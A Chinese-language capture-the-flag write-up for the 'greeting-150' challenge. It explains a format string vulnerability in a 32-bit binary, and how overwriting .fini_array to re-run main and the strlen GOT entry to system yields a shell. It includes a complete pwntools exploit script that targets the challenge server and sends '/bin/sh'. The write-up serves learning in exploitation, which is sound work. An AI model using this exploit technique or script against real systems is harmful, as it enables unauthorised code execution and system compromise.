# greeting-150

题目来源：https://adworld.xctf.org.cn/task/

这道题漏洞点很明显，不过利用的方法有点复杂，是一个知识盲区，不过通过这道题也补充了这方面的知识点了，看一下这道题的安全防护：

```
Arch:     i386-32-little                                        
RELRO:    No RELRO                                                       
Stack:    Canary found                                            
NX:       NX enabled                                                     
PIE:      No PIE (0x8048000)
```

有 canary 和 NX 的防护，所以栈中构造溢出的可能性降低了，除非包含暴露 canary 的措施，看一下代码：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+1Ch] [ebp-84h]
  char v5; // [esp+5Ch] [ebp-44h]
  unsigned int v6; // [esp+9Ch] [ebp-4h]

  v6 = __readgsdword(0x14u);
  printf("Please tell me your name... ");
  if ( !getnline(&v5, 64) )
    return puts("Don't ignore me ;( ");
  sprintf(&s, "Nice to meet you, %s :)\n", &v5);
  return printf(&s);
}

size_t __cdecl getnline(char *s, int n)
{
  char *v3; // [esp+1Ch] [ebp-Ch]

  fgets(s, n, stdin);
  v3 = strchr(s, 10);
  if ( v3 )
    *v3 = 0;
  return strlen(s);
}
```

代码非常短，而且漏洞点特别好找，由于 s 字符串可以通过 v5 字符串获得，并且 v5 是由用户输入的，所以很明显包含了一个格式化字符串漏洞。

那么这里的问题就是，这道题很明显需要我们构造 system('/bin/sh') 并且执行。我在这里思考到了修改 got 表，但是计算修改了也无法再执行到了，因为漏洞点 printf(&s) 已经是函数的最后了。

所以这里就要使用到一个新的知识点，就是一个程序的 init_array 和 fini_array。

> `.init_array`和 `.fini_array` 节（早期版本被称为 .ctors和 .dtors ）中存放了指向初始化代码和终止代码的函数指针。 `.init_array` 函数指针会在 main() 函数调用之前触发。这就意味着，可以通过重写某个指向正确地址的指针来将控制流指向病毒或者寄生代码。 `.fini_array` 函数指针在 main() 函数执行完之后才被触发，在某些场景下这一点会非常有用。

也就是说 fini_array 中包含的指针如果可以修改为 main 函数或者是 start 函数，那么该进程会从头开始再执行一次。有了这个方法，考察这个程序发现存在 fini_array 段，因此修改 got 的想法是可以实现的，那么这里最好的是修改 strlen 函数的 got，因为它的参数恰巧是用户能输入的，我们只需要将 strlen 的 got 表项设置为 system 函数随后在下一次输入 /bin/sh 就可以完成执行。

上面就是完整的解题思路了，下面贴一下代码：

 ```python
from pwn import *                                                      
from LibcSearcher import *                                              
import time                                                                                                                                                         
conn = remote("220.249.52.133", 38479)                                                   

fini_array = 0x08049934                                               
strlen_got = 0x08049A54                                
start_addr = 0x080484F0                                               
system_plt = 0x08048490                                            
str_len = len('Nice to meet you, ')                                                                                                                                    
print conn.recv()                                                           
print conn.recv()                                                         
str1 = 'AA' + p32(strlen_got + 2) + p32(fini_array + 2) + p32(strlen_got) + p32(fini_array)                             
num1 = 0x804 - str_len - 0x12                                         
print(num1)                                                                
str1 += '%'+str(num1)+'c%12$hn%13$hn'                                      
num2 = 0x8490 - 0x0804                                               
print(num2)                                                               
str1 += '%'+str(num2)+'c%14$hn'                                          
num3 = 0x84F0 - 0x8490                                              
print(num3)                                                               
str1 += '%'+str(num3)+'c%15$hn'                                    
print(str1)                                     
conn.sendline(str1)                              
conn.recvuntil('Please tell me your name... ')            
conn.sendline('/bin/sh')                                      
conn.interactive()
 ```

